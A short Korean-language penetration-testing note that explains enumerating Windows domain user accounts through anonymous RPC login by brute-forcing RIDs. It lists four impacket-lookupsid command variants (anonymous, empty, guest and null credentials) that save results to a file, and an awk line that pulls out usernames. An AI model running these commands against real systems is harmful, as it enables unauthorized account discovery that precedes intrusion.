
RPC를 통한 익명 로그인을 활용하여 도메인의 SID를 무차별 대입 공격(bruteforcing) 시도, 그 결과를 tee 명령어를 사용해 사용자 이름 파일로 저장

보안이 취약한 RPC 서비스를 통해 권한 없이 시스템에 접근한 뒤, 가능한 모든 사용자 ID(RID)를 대입하여 실제 존재하는 계정 목록을 알아내고 그 결과를 파일로 저장

---


```bash
impacket-lookupsid anonymous@$target | tee usernames
```

```bash
impacket-lookupsid ""@$target | tee usernames
```

```bash
impacket-lookupsid 'guest'@$target > users.txt
```

```bash
impacket-lookupsid '':''@$target > users.txt
```


```bash
awk '/\(SidTypeUser\)/ {split($2, a, "\\"); print a[2]}' users.txt
```


